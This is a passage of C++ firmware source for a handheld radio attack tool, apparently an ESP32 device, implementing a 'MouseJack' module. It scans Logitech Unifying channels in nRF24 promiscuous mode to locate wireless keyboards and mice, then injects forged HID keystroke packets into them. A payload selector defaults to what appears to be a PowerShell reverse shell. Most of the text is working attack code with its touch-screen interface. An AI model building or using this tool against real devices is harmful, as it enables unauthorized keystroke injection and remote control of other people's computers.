                case '!':  key = 0x1E; mod = 0x02; break;
                case '@':  key = 0x1F; mod = 0x02; break;
                case '#':  key = 0x20; mod = 0x02; break;
                case '$':  key = 0x21; mod = 0x02; break;
                case '%':  key = 0x22; mod = 0x02; break;
                case '^':  key = 0x23; mod = 0x02; break;
                case '&':  key = 0x24; mod = 0x02; break;
                case '*':  key = 0x25; mod = 0x02; break;
                case '(':  key = 0x26; mod = 0x02; break;
                case ')':  key = 0x27; mod = 0x02; break;
                case '_':  key = 0x2D; mod = 0x02; break;
                case '+':  key = 0x2E; mod = 0x02; break;
                case '{':  key = 0x2F; mod = 0x02; break;
                case '}':  key = 0x30; mod = 0x02; break;
                case '|':  key = 0x31; mod = 0x02; break;
                case ':':  key = 0x33; mod = 0x02; break;
                case '"':  key = 0x34; mod = 0x02; break;
                case '~':  key = 0x35; mod = 0x02; break;
                case '<':  key = 0x36; mod = 0x02; break;
                case '>':  key = 0x37; mod = 0x02; break;
                case '?':  key = 0x38; mod = 0x02; break;
                default:   st->keystrokesSent++; continue;
            }
        }

        if (key) {
            // Build Logitech packet with LRC
            uint8_t pkt[10] = {0x00, 0xC1, mod, 0x00, key, 0, 0, 0, 0, 0};
            uint8_t lrc = 0;
            for (int i = 0; i < 9; i++) lrc ^= pkt[i];
            pkt[9] = lrc;

            bool ok = nrf24Radio.write(pkt, 10);
            if (ok) st->packetsOk++; else st->packetsFail++;

            // Key release
            delay(5);
            pkt[2] = 0; pkt[4] = 0;
            lrc = 0;
            for (int i = 0; i < 9; i++) lrc ^= pkt[i];
            pkt[9] = lrc;
            nrf24Radio.write(pkt, 10);

            delay(10);  // 10ms between keystrokes
        }

        st->keystrokesSent++;
    }

    // Send Enter to execute
    if (mjTaskRunning) {
        uint8_t pkt[10] = {0x00, 0xC1, 0x00, 0x00, 0x28, 0, 0, 0, 0, 0};  // Enter
        uint8_t lrc = 0;
        for (int i = 0; i < 9; i++) lrc ^= pkt[i];
        pkt[9] = lrc;
        nrf24Radio.write(pkt, 10);
        delay(5);
        pkt[4] = 0;
        lrc = 0;
        for (int i = 0; i < 9; i++) lrc ^= pkt[i];
        pkt[9] = lrc;
        nrf24Radio.write(pkt, 10);
    }

    st->injecting = false;

    // Cleanup
    nrf24Radio.flush_tx();
    nrf24Radio.powerDown();
    SPI.end();

    Serial.printf("[MOUSEJACK] Core 0: Injection complete, %d/%d sent, %d ok, %d fail\n",
        st->keystrokesSent, st->keystrokesTotal, st->packetsOk, st->packetsFail);

    mjTaskHandle = NULL;
    mjTaskDone = true;
    vTaskDelete(NULL);
}

static void startMjTask() {
    if (mjTaskHandle != NULL || mj == nullptr) return;
    mj->injecting = true;
    mjTaskRunning = true;
    mjTaskDone = false;
    xTaskCreatePinnedToCore(mjTxTask, "MJack", 8192, mj, 1, &mjTaskHandle, 0);
}

static void stopMjTask() {
    if (mjTaskHandle == NULL) return;
    mjTaskRunning = false;
    unsigned long start = millis();
    while (!mjTaskDone && millis() - start < 500) delay(10);
    mjTaskHandle = NULL;
}

// ── Dual-core scan task (promiscuous mode device discovery) ───────────────
static TaskHandle_t mjScanHandle = NULL;
static volatile bool mjScanRunning = false;
static volatile bool mjScanDone = false;
static volatile int  mjScanProgress = 0;    // 0-100
static volatile int  mjScanPass = 1;        // 1-3
static volatile int  mjScanCh = 0;          // current channel being scanned
static volatile bool mjScanFound = false;
static uint8_t mjFoundAddr[5] = {0};
static volatile uint8_t mjFoundChannel = 0;
static volatile uint8_t mjFoundType = 0;

// Logitech Unifying channels (24 frequencies)
static const uint8_t mjLogitechCh[] = {
    2, 5, 8, 17, 23, 26, 29, 32, 35, 38, 41, 44,
    47, 50, 53, 56, 59, 62, 65, 68, 71, 74, 77, 80
};
#define MJ_LOGI_CH_COUNT 24

static void mjScanTask(void* param) {
    // Reinit SPI on Core 0
    SPI.end();
    delay(5);
    SPI.begin(18, 19, 23);
    SPI.setFrequency(8000000);

    // Configure pins
    pinMode(NRF_CE, OUTPUT);
    pinMode(NRF_CSN, OUTPUT);
    digitalWrite(NRF_CE, LOW);
    digitalWrite(NRF_CSN, HIGH);

    // Deselect other SPI devices
    #ifndef NMRF_HAT
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);
    #endif
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    delay(10);

    // Power up
    snWriteReg(_NRF24_CONFIG, 0x02);  // PWR_UP
    delayMicroseconds(1500);

    // Promiscuous config (identical to Sniffer)
    snWriteReg(_NRF24_SETUP_AW, 0x00);    // 2-byte illegal address width
    snWriteReg(_NRF24_EN_AA, 0x00);        // No auto-ack
    snWriteReg(_NRF24_EN_RXADDR, 0x03);    // Pipes 0+1
    snWriteReg(_NRF24_RF_SETUP, 0x09);     // 2Mbps, -6dBm
    snWriteReg(0x11, 32);                   // RX_PW_P0 = 32
    snWriteReg(0x12, 32);                   // RX_PW_P1 = 32

    const uint8_t a0[] = {0xAA, 0x55};
    const uint8_t a1[] = {0x55, 0xAA};
    snWriteRegMulti(_NRF24_RX_ADDR_P0, a0, 2);
    snWriteRegMulti(_NRF24_RX_ADDR_P1, a1, 2);

    snFlushRx();
    snWriteReg(0x07, 0x70);  // Clear IRQ flags

    // RX mode, CRC disabled, power up
    snWriteReg(_NRF24_CONFIG, 0x03);
    delayMicroseconds(1500);
    digitalWrite(NRF_CE, HIGH);
    delayMicroseconds(130);

    #if CYD_DEBUG
    Serial.println("[MOUSEJACK] Core 0: Scan started");
    #endif

    uint8_t rxBuf[32];
    int totalSteps = MJ_LOGI_CH_COUNT * 3;  // 24 channels × 3 passes
    int step = 0;

    for (int pass = 1; pass <= 3 && mjScanRunning && !mjScanFound; pass++) {
        mjScanPass = pass;
        for (int ci = 0; ci < MJ_LOGI_CH_COUNT && mjScanRunning && !mjScanFound; ci++) {
            uint8_t ch = mjLogitechCh[ci];
            mjScanCh = ch;
            step++;
            mjScanProgress = (step * 100) / totalSteps;

            // Set channel
            snWriteReg(_NRF24_RF_CH, ch);
            snFlushRx();

            // Dwell 100ms — read FIFO repeatedly
            unsigned long dwellEnd = millis() + 100;
            while (millis() < dwellEnd && mjScanRunning && !mjScanFound) {
                int n = snReadPayload(rxBuf, 32);
                if (n == 0) {
                    delayMicroseconds(200);
                    continue;
                }

                if (isNoise(rxBuf, n)) continue;

                // Check for HID frame types (byte 5 = frame type after 5-byte address)
                uint8_t frameType = (n > 5) ? rxBuf[5] : 0x00;
                if (frameType == 0xC1 || frameType == 0xC2 || frameType == 0x0F) {
                    // Found a HID device!
                    memcpy(mjFoundAddr, rxBuf, 5);
                    mjFoundChannel = ch;
                    mjFoundType = frameType;
                    mjScanFound = true;
                    mjScanProgress = 100;

                    #if CYD_DEBUG
                    Serial.printf("[MOUSEJACK] FOUND device: %02X:%02X:%02X:%02X:%02X ch=%d type=0x%02X\n",
                        mjFoundAddr[0], mjFoundAddr[1], mjFoundAddr[2],
                        mjFoundAddr[3], mjFoundAddr[4], ch, frameType);
                    #endif
                    break;
                }
            }

            vTaskDelay(1);  // Yield between channels
        }
    }

    // Cleanup — restore SETUP_AW before exit
    digitalWrite(NRF_CE, LOW);
    snWriteReg(_NRF24_SETUP_AW, 0x03);  // Restore 5-byte address width
    snWriteReg(_NRF24_CONFIG, 0x00);     // Power down
    nrf24ExitPromiscuous();

    #if CYD_DEBUG
    Serial.printf("[MOUSEJACK] Core 0: Scan done, found=%d\n", (int)mjScanFound);
    #endif

    mjScanHandle = NULL;
    mjScanDone = true;
    vTaskDelete(NULL);
}

static void startMjScan() {
    if (mjScanHandle != NULL) return;
    mjScanRunning = true;
    mjScanDone = false;
    mjScanFound = false;
    mjScanProgress = 0;
    mjScanPass = 1;
    mjScanCh = 0;
    mjFoundType = 0;
    memset(mjFoundAddr, 0, 5);
    mjFoundChannel = 0;
    if (mj) mj->scanning = true;
    xTaskCreatePinnedToCore(mjScanTask, "MJScan", 6144, NULL, 1, &mjScanHandle, 0);
}

static void stopMjScan() {
    if (mjScanHandle == NULL) return;
    mjScanRunning = false;
    unsigned long start = millis();
    while (!mjScanDone && millis() - start < 500) delay(10);
    mjScanHandle = NULL;
    if (mj) mj->scanning = false;
}

// ── Icon bar ──────────────────────────────────────────────────────────────
#define MJ_ICON_NUM 5
static const int mjIconX[MJ_ICON_NUM] = {10, SCALE_X(50), SCALE_X(90), SCALE_X(130), SCALE_X(170)};
static const unsigned char* const mjIcons[MJ_ICON_NUM] = {
    bitmap_icon_go_back,   // [0] Back
    bitmap_icon_scanner,   // [1] Scan
    bitmap_icon_key,       // [2] Test keystroke
    bitmap_icon_start,     // [3] Inject / Stop
    bitmap_icon_RIGHT      // [4] Next payload
};

static void drawMjIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < MJ_ICON_NUM; i++) {
        tft.drawBitmap(mjIconX[i], ICON_BAR_Y, mjIcons[i], 16, 16, HALEHOUND_MAGENTA);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// ── Test key feature (send harmless right-arrow to verify injection) ─────
static void mjTestKey() {
    if (!mj || !mj->hasTarget || mj->scanning || mj->injecting) return;

    nrf24ClaimSPI();
    delay(10);

    if (!nrf24Radio.begin()) {
        nrf24ReleaseSPI();
        mj->testOk = false;
        mj->testTime = millis();
        return;
    }

    nrf24Radio.setAutoAck(false);
    nrf24Radio.setDataRate(RF24_2MBPS);
    nrf24Radio.setCRCLength(RF24_CRC_16);
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setPayloadSize(10);
    nrf24Radio.setChannel(mj->targetChannel);
    nrf24Radio.openWritingPipe(mj->targetAddr);
    nrf24Radio.stopListening();

    // Right-arrow key (HID 0x4F, no modifier) — harmless cursor move
    uint8_t pkt[10] = {0x00, 0xC1, 0x00, 0x00, 0x4F, 0, 0, 0, 0, 0};
    uint8_t lrc = 0;
    for (int i = 0; i < 9; i++) lrc ^= pkt[i];
    pkt[9] = lrc;

    bool ok = nrf24Radio.write(pkt, 10);

    // Key release
    delay(5);
    pkt[4] = 0;
    lrc = 0;
    for (int i = 0; i < 9; i++) lrc ^= pkt[i];
    pkt[9] = lrc;
    nrf24Radio.write(pkt, 10);

    nrf24Radio.powerDown();
    nrf24ReleaseSPI();

    mj->testOk = ok;
    mj->testTime = millis();
}

// ── Skull row ─────────────────────────────────────────────────────────────
#define MJ_SKULL_Y    SCALE_Y(282)
#define MJ_SKULL_NUM  8
static const unsigned char* const mjSkulls[MJ_SKULL_NUM] = {
    bitmap_icon_skull_wifi, bitmap_icon_skull_bluetooth, bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz, bitmap_icon_skull_ir, bitmap_icon_skull_tools,
    bitmap_icon_skull_setting, bitmap_icon_skull_about
};
static int mjSkullFrame = 0;

static void drawMjSkulls() {
    int skullStartX = 10;
    int skullSpacing = SCALE_X(28);

    for (int i = 0; i < MJ_SKULL_NUM; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, MJ_SKULL_Y, 16, 16, TFT_BLACK);

        uint16_t color;
        if (mj && (mj->injecting || mj->scanning)) {
            int phase = (mjSkullFrame + i) % 8;
            if (phase < 4) {
                float ratio = phase / 3.0f;
                uint8_t r = (uint8_t)(ratio * 255);
                uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;
        }
        tft.drawBitmap(x, MJ_SKULL_Y, mjSkulls[i], 16, 16, color);
    }

    int labelX = skullStartX + (MJ_SKULL_NUM * skullSpacing) + 5;
    tft.fillRect(labelX, MJ_SKULL_Y, 50, 16, TFT_BLACK);
    uint16_t skullLblCol = HALEHOUND_GUNMETAL;
    const char* skullLbl = "RDY";
    if (mj && mj->injecting) { skullLblCol = HALEHOUND_HOTPINK; skullLbl = "TX!"; }
    else if (mj && mj->scanning) { skullLblCol = HALEHOUND_CYAN; skullLbl = "RX"; }
    else if (mj && mj->testTime > 0 && (millis() - mj->testTime < 1500)) {
        skullLblCol = mj->testOk ? HALEHOUND_BRIGHT : HALEHOUND_HOTPINK;
        skullLbl = mj->testOk ? "OK" : "FAIL";
    }
    tft.setTextColor(skullLblCol, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(labelX, MJ_SKULL_Y + 4);
    tft.print(skullLbl);

    mjSkullFrame++;
}

// ── Header (title + status) ──────────────────────────────────────────────
static void drawMjHeader() {
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCALE_Y(50), TFT_BLACK);

    drawGlitchText(SCALE_Y(55), "MOUSEJACK", &Nosifer_Regular10pt7b);

    if (mj && mj->scanning) {
        drawGlitchStatus(SCALE_Y(72), "SCANNING", HALEHOUND_CYAN);
    } else if (mj && mj->injecting) {
        drawGlitchStatus(SCALE_Y(72), "INJECTING", HALEHOUND_HOTPINK);
    } else if (mj && mj->keystrokesSent > 0) {
        drawGlitchStatus(SCALE_Y(72), "COMPLETE", HALEHOUND_BRIGHT);
    } else {
        drawGlitchStatus(SCALE_Y(72), "STANDBY", HALEHOUND_GUNMETAL);
    }

    tft.drawLine(0, SCALE_Y(82), SCREEN_WIDTH, SCALE_Y(82), HALEHOUND_HOTPINK);
}

// ── Draw target frame only ───────────────────────────────────────────────
static void drawMjTargetFrame() {
    int frameY = SCALE_Y(86);
    int frameH = SCALE_H(55);

    // Clear inside frame only (avoid redrawing borders when not needed)
    tft.fillRect(12, frameY + 2, CONTENT_INNER_W - 4, frameH - 4, TFT_BLACK);

    // Borders
    tft.drawRoundRect(10, frameY, CONTENT_INNER_W, frameH, 6, HALEHOUND_VIOLET);
    tft.drawRoundRect(11, frameY + 1, CONTENT_INNER_W - 2, frameH - 2, 5, HALEHOUND_GUNMETAL);

    if (mj->hasTarget) {
        // Device type with flanking skulls — size 2, centered
        const char* devStr = getDeviceTypeStr(mj->deviceType);
        int devLen = strlen(devStr);
        int devPixW = devLen * 12;  // size 2 = 12px per char
        int devX = (SCREEN_WIDTH - devPixW) / 2;
        tft.drawBitmap(devX - 20, frameY + 6, bitmap_icon_skull_wifi, 16, 16, HALEHOUND_BRIGHT);
        tft.setTextSize(2);
        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        tft.setCursor(devX, frameY + 6);
        tft.print(devStr);
        tft.drawBitmap(devX + devPixW + 4, frameY + 6, bitmap_icon_skull_wifi, 16, 16, HALEHOUND_BRIGHT);

        // Address + Channel
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(18, frameY + 26);
        tft.printf("%02X:%02X:%02X:%02X:%02X",
            mj->targetAddr[0], mj->targetAddr[1], mj->targetAddr[2],
            mj->targetAddr[3], mj->targetAddr[4]);
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(SCALE_X(130), frameY + 26);
        tft.printf("CH:%d", mj->targetChannel);

        // Test result — third line (flashes for 1.5s after test)
        if (mj->testTime > 0) {
            tft.setCursor(18, frameY + 40);
            if (millis() - mj->testTime < 1500) {
                if (mj->testOk) {
                    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
                    tft.print("TEST: OK  ");
                } else {
                    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
                    tft.print("TEST: FAIL");
                }
            } else {
                tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
                tft.printf("TEST: %s%s", mj->testOk ? "OK" : "FAIL", mj->testOk ? "  " : "");
            }
        }
    } else {
        tft.setTextSize(2);
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        int noTgtX = (SCREEN_WIDTH - (9 * 12)) / 2;
        tft.setCursor(noTgtX, frameY + 10);
        tft.print("NO TARGET");
        tft.setTextSize(1);
        int hintX = (SCREEN_WIDTH - (15 * 6)) / 2;
        tft.setCursor(hintX, frameY + 32);
        tft.print("(tap Scan icon)");
    }
}

// ── Draw action button only ──────────────────────────────────────────────
static void drawMjActionBtn() {
    int btnY = SCALE_Y(148);
    int btnH = SCALE_H(34);
    int btnX = 10;
    int btnW = CONTENT_INNER_W;

    uint16_t btnBorder, btnTextCol;
    const char* btnText;
    bool showSkulls = false;

    if (mj->injecting) {
        btnBorder = HALEHOUND_HOTPINK;
        btnTextCol = HALEHOUND_HOTPINK;
        btnText = "STOP INJECT";
        showSkulls = true;
    } else if (mj->scanning) {
        btnBorder = HALEHOUND_GUNMETAL;
        btnTextCol = HALEHOUND_GUNMETAL;
        btnText = "SCANNING...";
    } else if (!mj->hasTarget) {
        btnBorder = HALEHOUND_GUNMETAL;
        btnTextCol = HALEHOUND_GUNMETAL;
        btnText = "NO TARGET";
    } else {
        btnBorder = HALEHOUND_MAGENTA;
        btnTextCol = HALEHOUND_MAGENTA;
        btnText = "START INJECT";
        showSkulls = true;
    }

    tft.fillRoundRect(btnX, btnY, btnW, btnH, 5, HALEHOUND_DARK);
    tft.drawRoundRect(btnX, btnY, btnW, btnH, 5, btnBorder);
    tft.drawRoundRect(btnX + 1, btnY + 1, btnW - 2, btnH - 2, 4, btnBorder);

    if (showSkulls) {
        tft.drawBitmap(btnX + 6, btnY + 9, bitmap_icon_skull_wifi, 16, 16, btnBorder);
        tft.drawBitmap(btnX + btnW - 22, btnY + 9, bitmap_icon_skull_wifi, 16, 16, btnBorder);
    }

    tft.setTextSize(2);
    tft.setTextColor(btnTextCol);
    int txtLen = strlen(btnText);
    int txtPixW = txtLen * 12;
    int txtX = btnX + (btnW - txtPixW) / 2;
    tft.setCursor(txtX, btnY + 9);
    tft.print(btnText);
    tft.setTextSize(1);
}

// ── Draw payload selector line only ──────────────────────────────────────
static void drawMjPayloadLine() {
    int y = SCALE_Y(188);
    // Clear the line (payload names vary in length)
    tft.fillRect(10, y, SCREEN_WIDTH - 20, 10, TFT_BLACK);
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setCursor(10, y);
    tft.print("PAYLOAD: ");
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.print("\x10 ");
    tft.print(MJ_PAYLOAD_NAMES[mj->selectedPayload]);
}

// ── Draw status area only (progress bars + stats) ────────────────────────
static void drawMjStatus() {
    int y = SCALE_Y(204);
    // Clear status area only (between payload line and skulls)
    tft.fillRect(0, y, SCREEN_WIDTH, MJ_SKULL_Y - y - 4, TFT_BLACK);

    if (mj->scanning) {
        int barX = 10;
        int barW = SCREEN_WIDTH - 20;
        int barH = SCALE_H(16);
        tft.drawRoundRect(barX, y, barW, barH, 3, HALEHOUND_CYAN);
        int progress = (mjScanProgress * (barW - 4)) / 100;
        if (progress > 0) {
            tft.fillRoundRect(barX + 2, y + 2, progress, barH - 4, 2, HALEHOUND_CYAN);
        }
        y += barH + 4;
        tft.setTextColor(HALEHOUND_CYAN, TFT_BLACK);
        tft.setCursor(10, y);
        tft.printf("PASS %d/3  CH:%d  [%d%%]", (int)mjScanPass, (int)mjScanCh, (int)mjScanProgress);
    } else if (mj->injecting) {
        int barX = 10;
        int barW = SCREEN_WIDTH - 20;
        int barH = SCALE_H(16);
        tft.drawRoundRect(barX, y, barW, barH, 3, HALEHOUND_MAGENTA);
        int progress = 0;
        if (mj->keystrokesTotal > 0) {
            progress = (mj->keystrokesSent * (barW - 4)) / mj->keystrokesTotal;
        }
        if (progress > 0) {
            tft.fillRoundRect(barX + 2, y + 2, progress, barH - 4, 2, HALEHOUND_HOTPINK);
        }
        y += barH + 4;
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(10, y);
        tft.printf("TX:%d/%d  OK:%d  FAIL:%d",
            mj->keystrokesSent, mj->keystrokesTotal, mj->packetsOk, mj->packetsFail);
    } else if (mj->keystrokesSent > 0) {
        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        tft.setCursor(10, y);
        tft.print("INJECTION COMPLETE");
        y += 12;
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(10, y);
        tft.printf("TX:%d  OK:%d  FAIL:%d",
            mj->keystrokesSent, mj->packetsOk, mj->packetsFail);
    } else {
        if (mj->hasTarget) {
            tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
            tft.setCursor(10, y);
            tft.print("READY");
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setCursor(10, y);
            tft.print("SCAN FOR TARGET");
        }
    }
}

// ── Draw all content (called on state changes only) ──────────────────────
static void drawMjContent() {
    drawMjTargetFrame();
    drawMjActionBtn();
    drawMjPayloadLine();
    drawMjStatus();
    drawMjSkulls();
}

// ── Setup ─────────────────────────────────────────────────────────────────
void setup() {
    mjExitRequested = false;
    mjUiDrawn = false;
    mjLastDisplay = 0;
    mjSkullFrame = 0;

    // Allocate state on heap
    if (mj) { free(mj); mj = nullptr; }
    mj = (MjState*)calloc(1, sizeof(MjState));
    if (!mj) {
        tft.fillScreen(TFT_BLACK);
        drawCenteredText(120, "HEAP ALLOC FAILED", HALEHOUND_HOTPINK, 2);
        return;
    }

    // Check if mouseJackerTarget has a valid address from Sniffer
    bool hasAddr = false;
    for (int i = 0; i < 5; i++) { if (mouseJackerTarget[i] != 0) { hasAddr = true; break; } }
    if (hasAddr) {
        memcpy(mj->targetAddr, mouseJackerTarget, 5);
        mj->hasTarget = true;
    }
    mj->selectedPayload = MJ_REVSHELL_PS;
    mj->targetChannel = (mouseJackerChannel > 0) ? mouseJackerChannel : 2;
    mj->deviceType = mouseJackerDeviceType;
    mj->testTime = 0;

    // Init scan state
    mjScanHandle = NULL;
    mjScanRunning = false;
    mjScanDone = false;
    mjScanFound = false;
    mjScanProgress = 0;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawMjIconBar();
    drawMjHeader();
    drawMjContent();

    mjUiDrawn = true;

    #if CYD_DEBUG
    Serial.println("[MOUSEJACK] Setup complete");
    #endif
}

// ── Loop ──────────────────────────────────────────────────────────────────
void loop() {
    if (!mjUiDrawn) {
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            mjExitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // Check if scan completed with a found device
    if (mjScanDone && mj->scanning) {
        mj->scanning = false;
        if (mjScanFound) {
            memcpy(mj->targetAddr, mjFoundAddr, 5);
            memcpy(mouseJackerTarget, mjFoundAddr, 5);
            mj->targetChannel = mjFoundChannel;
            mouseJackerChannel = mjFoundChannel;
            mj->deviceType = mjFoundType;
            mouseJackerDeviceType = mjFoundType;
            mj->hasTarget = true;
        }
        drawMjHeader();
        drawMjContent();
    }

    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // [0] Back (x < 40)
            if (tx < 40) {
                if (mj->scanning) stopMjScan();
                if (mj->injecting) stopMjTask();
                mjExitRequested = true;
                return;
            }
            // [1] Scan (mjIconX[1] area)
            if (tx >= mjIconX[1] - 10 && tx < mjIconX[1] + 25) {
                waitForTouchRelease();
                delay(200);
                if (mj->scanning) {
                    stopMjScan();
                } else if (!mj->injecting) {
                    // Clear old target before scanning
                    memset(mj->targetAddr, 0, 5);
                    mj->hasTarget = false;
                    mj->deviceType = 0;
                    mj->testTime = 0;
                    mj->keystrokesSent = 0;
                    mj->packetsOk = 0;
                    mj->packetsFail = 0;
                    startMjScan();
                }
                drawMjHeader();
                drawMjContent();
                return;
            }
            // [2] Test keystroke (mjIconX[2] area)
            if (tx >= mjIconX[2] - 10 && tx < mjIconX[2] + 25) {
                waitForTouchRelease();
                delay(200);
                mjTestKey();
                drawMjContent();
                return;
            }
            // [3] Inject / Stop (mjIconX[3] area)
            if (tx >= mjIconX[3] - 10 && tx < mjIconX[3] + 25) {
                waitForTouchRelease();
                delay(200);
                if (mj->injecting) {
                    stopMjTask();
                    mj->injecting = false;
                } else if (mj->hasTarget && !mj->scanning) {
                    startMjTask();
                }
                drawMjHeader();
                drawMjContent();
                return;
            }
            // [4] Next payload (mjIconX[4] area)
            if (tx >= mjIconX[4] - 10 && tx < mjIconX[4] + 25) {
                waitForTouchRelease();
                delay(200);
                mj->selectedPayload = (mj->selectedPayload + 1) % MJ_PAYLOAD_COUNT;
                drawMjContent();
                return;
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (mj->scanning) stopMjScan();
        if (mj->injecting) stopMjTask();
        mjExitRequested = true;
        return;
    }

    // Update display — 5 Hz when active, 2 Hz idle (skulls only)
    unsigned long mjInterval = (mj && (mj->injecting || mj->scanning)) ? 200 : 500;
    if (millis() - mjLastDisplay >= mjInterval) {
        if (mj && (mj->injecting || mj->scanning)) {
            drawMjHeader();
            drawMjStatus();
        }
        // Test result flash — update target frame for 1.5s after test
        if (mj && mj->testTime > 0 && (millis() - mj->testTime < 1600)) {
            drawMjTargetFrame();
        }
        drawMjSkulls();
        mjLastDisplay = millis();
    }
}

bool isExitRequested() {
    return mjExitRequested;
}

void cleanup() {
    if (mj && mj->scanning) stopMjScan();
    if (mj && mj->injecting) stopMjTask();
    if (mj) { free(mj); mj = nullptr; }
    mjExitRequested = false;
    mjUiDrawn = false;
}

}  // namespace MouseJack
